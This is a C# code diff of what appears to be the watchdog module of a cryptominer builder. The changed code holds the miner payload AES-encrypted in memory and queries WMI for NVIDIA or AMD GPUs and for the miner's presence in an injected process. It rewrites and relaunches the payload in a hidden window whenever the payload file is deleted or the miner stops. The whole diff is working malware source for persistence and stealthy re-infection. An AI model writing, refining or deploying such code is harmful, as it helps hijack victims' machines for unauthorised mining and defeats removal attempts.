@@ -8,7 +8,6 @@ using System.Security.Cryptography;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading;
-using System.Linq;
 #if DefDebug
 using System.Windows.Forms;
 #endif
@@ -23,16 +22,15 @@ using System.Windows.Forms;
 
 public partial class RProgram
 {
-    public static string rxM = "";
-    public static string rplp = "";
-    public static int checkcount = 0;
+    public static byte[] rxM = {};
+    public static int rcheckcount = 0;
+    public static string rplp = (PayloadPath).ToLower();
 
     public static void Main()
     {
         try
         {
-            rplp = PayloadPath;
-            rxM = Convert.ToBase64String(File.ReadAllBytes(rplp).Reverse().ToArray());
+            rxM = RAES_Method(File.ReadAllBytes(rplp), true);
             RWDLoop();
         }
         catch (Exception ex)
@@ -48,26 +46,51 @@ public partial class RProgram
     {
         try
         {
-            if (!File.Exists(rplp))
+            string rarg1 = "";
+            bool rarg2 = false;
+            string rarg3 = Encoding.ASCII.GetString(RAES_Method(Convert.FromBase64String("#MINERID")));
+
+            var rarg4 = new ConnectionOptions();
+            rarg4.Impersonation = ImpersonationLevel.Impersonate;
+            var rarg5 = new ManagementScope(@"\root\cimv2", rarg4);
+            rarg5.Connect();
+
+            var rarg6 = new ManagementObjectSearcher(rarg5, new ObjectQuery("SELECT Name, VideoProcessor FROM Win32_VideoController")).Get();
+            foreach (ManagementObject MemObj in rarg6)
             {
-                checkcount = 0;
-                File.WriteAllBytes(rplp, Convert.FromBase64String(rxM).Reverse().ToArray());
-                RStart();
+                rarg1 += (" " + MemObj["VideoProcessor"] + " " + MemObj["Name"]).ToLower();
             }
-            if (!RCheckProc())
+
+            var rarg7 = new ManagementObjectSearcher(rarg5, new ObjectQuery(string.Format("Select CommandLine from Win32_Process where Name='{0}'", Encoding.ASCII.GetString(RAES_Method(Convert.FromBase64String("#InjectionTarget")))))).Get();
+            foreach (ManagementObject retObject in rarg7)
             {
-                if (checkcount < 2)
+                if (retObject != null && retObject["CommandLine"] != null && retObject["CommandLine"].ToString().Contains(rarg3))
                 {
-                    checkcount += 1;
+                    rarg2 = true;
                 }
-                else
+            }
+
+            if (!File.Exists(rplp) || (!rarg2 && (rarg1.Contains("nvidia") || rarg1.Contains("amd"))))
+            {
+                if (!File.Exists(rplp) || rcheckcount > 2)
                 {
-                    checkcount = 0;
-                    RStart();
+                    rcheckcount = 0;
+                    File.WriteAllBytes(rplp, RAES_Method(rxM));
+                    Process.Start(new ProcessStartInfo
+                    {
+                        FileName = rplp,
+                        WindowStyle = ProcessWindowStyle.Hidden,
+                        WorkingDirectory = Path.GetDirectoryName(rplp),
+                        CreateNoWindow = true,
+                    });
                 }
+                else 
+                {
+                    rcheckcount += 1;
+                }
+                
             }
             Thread.Sleep(startDelay * 1000 + 5000);
-
             RWDLoop();
         }
         catch (Exception ex)
@@ -79,64 +102,20 @@ public partial class RProgram
 
     }
 
-    public static void RStart()
+    public static byte[] RAES_Method(byte[] rarg1, bool rarg2 = false)
     {
-        Process.Start(new ProcessStartInfo
+        var rarg3 = Encoding.ASCII.GetBytes("#IV");
+        var rarg4 = new Rfc2898DeriveBytes("#KEY", Encoding.ASCII.GetBytes("#SALT"), 100);
+        var rarg5 = new RijndaelManaged() { KeySize = 256, Mode = CipherMode.CBC };
+        var rarg6 = rarg2 ? rarg5.CreateEncryptor(rarg4.GetBytes(16), rarg3) : rarg5.CreateDecryptor(rarg4.GetBytes(16), rarg3);
+        using (var rarg7 = new MemoryStream())
         {
-            FileName = rplp,
-            WindowStyle = ProcessWindowStyle.Hidden,
-            WorkingDirectory = Path.GetDirectoryName(rplp),
-            CreateNoWindow = true,
-        });
-    }
-
-    public static bool RCheckProc()
-    {
-        try
-        {
-            string gpu = "";
-
-            var options = new ConnectionOptions();
-            options.Impersonation = ImpersonationLevel.Impersonate;
-            var scope = new ManagementScope(@"\root\cimv2", options);
-            scope.Connect();
-
-            var query = new ObjectQuery("SELECT Name, VideoProcessor FROM Win32_VideoController");
-            var managementObjectSearcher = new ManagementObjectSearcher(scope, query);
-            var managementObjectCollection = managementObjectSearcher.Get();
-            foreach (ManagementObject MemObj in managementObjectCollection)
+            using (var rarg8 = new CryptoStream(rarg7, rarg6, CryptoStreamMode.Write))
             {
-                gpu += (" " + MemObj["VideoProcessor"] + " " + MemObj["Name"]).ToLower();
+                rarg8.Write(rarg1, 0, rarg1.Length);
+                rarg8.Close();
             }
-
-            if(!gpu.Contains("nvidia") && !gpu.Contains("amd"))
-            {
-                return true;
-            }
-
-            var options2 = new ConnectionOptions();
-            options2.Impersonation = ImpersonationLevel.Impersonate;
-            var scope2 = new ManagementScope(@"\root\cimv2", options2);
-            scope2.Connect();
-
-            string wmiQuery2 = string.Format("Select CommandLine from Win32_Process where Name='{0}'", "#InjectionTarget");
-            var query2 = new ObjectQuery(wmiQuery2);
-            var managementObjectSearcher2 = new ManagementObjectSearcher(scope2, query2);
-            var managementObjectCollection2 = managementObjectSearcher2.Get();
-            foreach (ManagementObject retObject in managementObjectCollection2)
-            {
-                if (retObject != null && retObject["CommandLine"] != null && retObject["CommandLine"].ToString().Contains("--cinit-find-e"))
-                {
-                    return true;
-                }
-            }
+            return rarg7.ToArray();
         }
-        catch (Exception ex)
-        {
-#if DefDebug
-            MessageBox.Show("W3: " + Environment.NewLine + ex.ToString());
-#endif
-        }
-        return false;
     }
 }
